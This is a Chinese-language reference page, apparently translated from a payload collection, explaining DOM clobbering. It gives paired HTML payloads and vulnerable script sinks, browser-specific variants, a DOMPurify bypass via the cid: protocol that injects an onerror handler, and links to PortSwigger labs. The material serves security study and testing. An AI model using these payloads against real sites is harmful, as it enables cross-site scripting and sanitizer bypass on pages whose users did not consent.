[原文文档](README.en.md)

# DOM破坏

> DOM破坏是一种技术，其中全局变量可以通过使用某些ID或名称命名HTML元素来被覆盖或"破坏"。这可能导致脚本中的意外行为并可能导致安全漏洞。

## 摘要

- [工具](#工具)
- [方法论](#方法论)
- [实验室](#实验室)
- [参考资料](#参考资料)

## 工具

- [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - 移动和桌面Web浏览器DOM破坏有效载荷的综合列表
- [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) - 用于测试各种HTML解析器和清理器的基于Web的工具
- [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==) - 揭示浏览器如何解析HTML并发现变异的XSS漏洞

## 方法论

利用需要页面中的任何种类的`HTML注入`。

- 破坏`x.y.value`

    ```html
    // 有效载荷
    <form id=x><output id=y>我已被破坏</output>

    // 汇聚点
    <script>alert(x.y.value);</script>
    ```

- 使用ID和name属性一起形成DOM集合来破坏`x.y`

    ```html
    // 有效载荷
    <a id=x><a id=x name=y href="已破坏">

    // 汇聚点
    <script>alert(x.y)</script>
    ```

- 破坏`x.y.z` - 3层深度

    ```html
    // 有效载荷
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // 汇聚点
    <script>alert(x.y.z)</script>
    ```

- 破坏`a.b.c.d` - 超过3层

    ```html
    // 有效载荷
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:已破坏>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // 汇聚点
    <script>alert(a.b.c.d)</script>
    ```

- 破坏`forEach`（仅限Chrome）

    ```html
    // 有效载荷
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // 汇聚点
    <script>x.y.forEach(element=>alert(element))</script>
    ```

- 使用与相同`id`属性的`<html>`或`<body>`标签破坏`document.getElementById()`

    ```html
    // 有效载荷
    <html id="cdnDomain">已破坏</html>
    <svg><body id=cdnDomain>已破坏</body></svg>


    // 汇聚点 
    <script>
    alert(document.getElementById('cdnDomain').innerText);//已破坏
    </script>
    ```

- 破坏`x.username`

    ```html
    // 有效载荷
    <a id=x href="ftp:已破坏-用户名:已破坏-密码@a">

    // 汇聚点
    <script>
    alert(x.username)//已破坏-用户名
    alert(x.password)//已破坏-密码
    </script>
    ```

- 破坏（仅限Firefox）

    ```html
    // 有效载荷
    <base href=a:abc><a id=x href="Firefox<>">

    // 汇聚点
    <script>
    alert(x)//Firefox<>
    </script>
    ```

- 破坏（仅限Chrome）

    ```html
    // 有效载荷
    <base href="a://已破坏<>"><a id=x name=x><a id=x name=xyz href=123>

    // 汇聚点
    <script>
    alert(x.xyz)//a://已破坏<>
    </script>
    ```

## 技巧

- DomPurify允许`cid:`协议，它不编码双引号（"`"）：`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`

## 实验室

* [PortSwigger - 利用DOM破坏启用XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
* [PortSwigger - 破坏DOM属性以绕过HTML过滤器](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
* [PortSwigger - CSP保护的DOM破坏测试用例](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)

## 参考资料

* [通过DOM破坏绕过CSP - Gareth Heyes - 2023年6月5日](https://portswigger.net/research/bypassing-csp-via-dom-clobbering)
* [DOM破坏 - HackTricks - 2023年1月27日](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
* [DOM破坏 - PortSwigger - 2020年9月25日](https://portswigger.net/web-security/dom-based/dom-clobbering)
* [DOM破坏卷土重来 - Gareth Heyes - 2020年2月6日](https://portswigger.net/research/dom-clobbering-strikes-back)
* [通过DOM破坏劫持服务工作者 - Gareth Heyes - 2022年11月29日](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)